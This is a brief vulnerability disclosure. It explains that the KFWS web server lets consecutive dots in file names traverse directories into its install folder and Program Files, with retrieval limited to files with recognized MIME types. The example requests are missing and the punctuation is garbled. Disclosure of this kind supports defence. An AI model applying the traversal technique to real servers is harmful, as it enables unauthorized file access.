This is not a traditional directory ， traversal attack. KFWS does not properly handle consecutive dot characters ， in the file name :  ， - Current Directory ， - 403 Forbidden ， - KFWS install dir ( OOPS !  )  ， - Program Files ， This vulnerability is limited by the internal hack defenses of the server ， - only files with recognized MIME types can be retreived.
